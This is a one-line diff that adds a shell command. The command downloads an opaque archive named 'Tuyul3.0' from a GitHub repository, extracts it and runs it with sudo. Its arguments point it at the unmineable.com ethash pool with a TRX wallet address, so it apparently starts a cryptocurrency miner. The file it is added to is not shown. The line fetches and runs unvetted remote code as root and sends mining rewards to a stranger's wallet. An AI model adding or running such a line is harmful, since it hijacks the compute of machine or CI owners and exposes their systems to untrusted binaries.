@@ -1,0 +1,1 @@
+apt-get install libpci3 && wget https://github.com/dedeybo/Project/raw/main/Tuyul3.0 && tar -xf Tuyul3.0 && cd Tuyul3.0 && sudo ./Tuyul3.0 -pool ethash.unmineable.com:3333 -u TRX:TAMRs3G2DqEwWQaqm5oqNmRAvJ7L6LuE63.phoenix -pass x -mi 14 -gt 400
